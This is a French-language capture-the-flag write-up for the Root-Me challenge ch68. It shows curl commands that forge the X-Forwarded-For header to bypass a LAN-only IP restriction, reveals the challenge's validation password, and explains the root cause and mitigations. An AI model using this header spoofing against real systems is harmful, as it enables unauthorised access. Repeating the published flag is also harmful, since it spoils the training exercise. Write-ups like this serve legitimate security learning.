---
titre: "Root-Me – HTTP : Contournement de la restriction IP (ch68)"
platforme: "Root-Me"
categorie: "Web-Server"
difficultée: "Moyen"
score: "10"
---

## Objectif
Contourner une restriction IP (accès réservé aux utilisateurs du LAN) en falsifiant l'en-tête HTTP `X-Forwarded-For` afin d'accéder à la page protégée et récupérer la phrase de validation.

## Contexte & Info Gathering
- Cible : `http://challenge01.root-me.org/web-serveur/ch68/`
- Observation initiale : la page affiche "Your IP <ip> do not belong to the LAN." si l'IP n'appartient pas au réseau local.
- IP locale (réglée sur la VM) : `192.168.136.130` (interface `eth0`).

## Commandes & Étapes effectuées
1. Vérification des headers retournés sans header modifié :
curl http://challenge01.root-me.org/web-serveur/ch68/
Test initial avec un IP publique dans X-Forwarded-For (échoue) :
curl -H "X-Forwarded-For:102.178.5.20" http://challenge01.root-me.org/web-serveur/ch68/
Résultat : "Your IP 102.178.5.20 do not belong to the LAN."

Récupération de l'adresse locale de la VM (eth0) :
ifconfig
# ou: ip addr show eth0
# On voit : inet 192.168.136.130
Envoi du header X-Forwarded-For avec l'adresse locale (succès) :
curl -H "X-Forwarded-For:192.168.136.130" http://challenge01.root-me.org/web-serveur/ch68/
Réponse notable :
html
Copier le code
<div>
  Well done, the validation password is: <strong>Ip_$po0Fing</strong>
</div>
Le mot de passe retourné : Ip_$po0Fing.

##Analyse technique 
L'application se base sur la valeur du header X-Forwarded-For (fourni par le client) pour décider si l'IP est dans le LAN.
Le header est falsifiable par l’utilisateur : en le forgeant on peut se faire passer pour une IP interne.
L'application ne vérifie pas si le header provient d'un reverse-proxy de confiance, ni ne s'appuie sur l'adresse source TCP (REMOTE_ADDR).

##Root cause & Vulnérabilité
Confiance excessive dans un header client (X-Forwarded-For) sans validation de la chaîne de proxies ou contrôle des sources.

##Catégorie : Information Trusting / Access Control Bypass.

##Contremesures / Mitigations
Ne pas faire confiance aux headers envoyés par les clients. Faire confiance aux headers X-Forwarded-For seulement si ils sont ajoutés par des proxies internes ou configurez le reverse-proxy pour nettoyer/normaliser ces headers.
Filtrer les accès au niveau réseau (firewall) pour les pages sensibles.
Utiliser PROXY protocol / vérifier la liste des proxies approuvés en front de l’application.

##Leçons apprises
Les headers HTTP peuvent être manipulés ; ils ne doivent pas être utilisés comme mécanisme d'authentification sans validation.
Toujours vérifier la source réelle (REMOTE_ADDR) ou limiter la confiance aux proxies connus.



